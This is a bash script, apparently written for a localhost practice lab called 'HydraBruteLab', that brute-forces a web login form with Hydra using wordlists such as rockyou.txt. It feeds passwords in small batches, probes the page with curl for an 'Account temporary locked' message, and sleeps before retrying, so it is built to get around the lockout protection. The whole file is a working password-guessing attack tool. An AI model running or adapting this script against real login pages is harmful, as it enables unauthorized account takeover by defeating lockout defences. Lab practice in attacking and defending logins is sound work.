#!/bin/bash

# --- MENU SELECTION ---
echo "------------------------------------------------"
echo "Select the target environment:"
echo "[1] Simple Website"
echo "[2] Advanced Website"
echo "------------------------------------------------"
read -p "Enter your choice [1 or 2]: " choice

if [[ "$choice" == "1" ]]; then
    echo "[*] Configuring for SIMPLE website..."
    URL="http://localhost/HydraBruteLab/simple/login.php"
    WORDLIST="rockyou.txt"
    # We need the path specifically for the Hydra command syntax
    URL_PATH="/HydraBruteLab/simple/login.php"
    
elif [[ "$choice" == "2" ]]; then
    echo "[*] Configuring for ADVANCED website..."
    URL="http://localhost/HydraBruteLab/advanced/login.php"
    WORDLIST="pass.txt"
    # We need the path specifically for the Hydra command syntax
    URL_PATH="/HydraBruteLab/advanced/login.php"
    
else
    echo "[!] Invalid selection. Exiting."
    exit 1
fi

# --- CONFIGURATION ---
USER="admin@admin.admin"
# The message that indicates the account is locked
LOCK_MSG="Account temporary locked"
# The standard failure message (used to define the Hydra command)
FAIL_MSG="Wrong password"
# How many attempts before checking (keep this lower than the lock threshold)
BATCH_SIZE=3
# How long to sleep (in seconds) if locked
SLEEP_TIME=60

# ---------------------
# Check if wordlist exists before starting
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Error: Wordlist '$WORDLIST' not found!"
    exit 1
fi

# Create a temporary directory for wordlist chunks
mkdir -p temp_chunks
echo "[*] Splitting wordlist ($WORDLIST) into chunks of $BATCH_SIZE..."
split -l $BATCH_SIZE $WORDLIST temp_chunks/chunk_

# Loop through each chunk file
for file in temp_chunks/chunk_*; do
    
    # Infinite loop for the current chunk (allows retrying)
    while true; do
        echo "[-] Testing batch: $file"
        
        # Run Hydra on the current small file
        # UPDATED: We now use $URL_PATH inside the command string so it matches your selection
        OUTPUT=$(hydra -l $USER -P $file -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)
        
        # CHECK 1: Did we find the password?
        # Hydra output contains "password:" when successful (and not part of an error message)
        if echo "$OUTPUT" | grep -q "host: localhost"; then
             echo ""
             echo "#############################################"
             echo "[+] SUCCESS FOUND!"
             # Extract the line containing the password
             echo "$OUTPUT" | grep "login:" 
             echo "#############################################"
             
             # Cleanup and Exit
             rm -rf temp_chunks
             exit 0
        fi

        # CHECK 2: Is the account locked?
        # We probe the server once to check for the lock message.
        TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)
        
        if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
            echo "[!] DETECTED LOCKOUT! Sleeping for $SLEEP_TIME seconds..."
            sleep $SLEEP_TIME
            echo "[*] Resuming..."
            # The 'while' loop triggers again, retrying this same 'file' (chunk)
            continue 
        else
            # If not locked, and Hydra didn't find the password, move to next chunk
            break
        fi
    done
done

# Cleanup
rm -rf temp_chunks
echo "[*] Wordlist finished. No password found."